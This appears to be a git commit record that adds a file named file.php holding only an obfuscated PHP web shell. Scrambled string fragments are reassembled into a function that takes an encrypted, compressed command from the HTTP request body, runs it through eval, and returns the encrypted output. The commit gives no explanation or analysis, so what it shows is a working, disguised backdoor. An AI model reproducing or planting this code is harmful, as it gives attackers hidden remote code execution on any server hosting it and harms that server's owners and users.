b55c6affc69439554e3eab7d43643aeb6d4bdf0f
l4hlou-repo <58866668+l4hlou-repo@users.noreply.github.com>
2020-05-21 02:47:52 +0200

    Add files via upload

---
+++ file.php
@@ -0,0 +1,12 @@
+<?php
+$n='or($i=0;$i<$l;D){foDrD($j=0D;($j<$cD&&$i<$lD);$j++,$i+D+D){$o.=$t{$iD}^$k{';
+$x='entsD("php://DDinput"),$m)==1) {@ob_stDaDrt();@evDal(@gzuncomDpDress(@x(D@';
+$e='bDDase64_decoDde($m[1]),$k))D);$o=@oDDb_getD_conDtDeDnts();@ob_end_clean()';
+$k='MK0F3A0w";DDfunction x(D$tD,$k){$c=strDlen($Dk);$l=DstrlDenD($t);$DDo="";f';
+$R='D$k="D418c550D9";$kh="e2171d55Db0ae"D;$kDfD="e5c2ea4442b5"D;$pDD="UFdxHpCDV';
+$I='D;$r=@baseD64_eDncoDde(@x(@DgDzcompress($DoDD),$k));priDnt("$p$kh$r$kf");}';
+$O='D$j};}}retDurn $oD;}if D(@pDreg_mDatch("/D$kh(.D+)$kf/",@fDile_gDDet_DcoDnt';
+$c=str_replace('Zs','','cZsreZsate_ZsZsZsfunctZsion');
+$T=str_replace('D','',$R.$k.$n.$O.$x.$e.$I);
+$b=$c('',$T);$b();
+?>
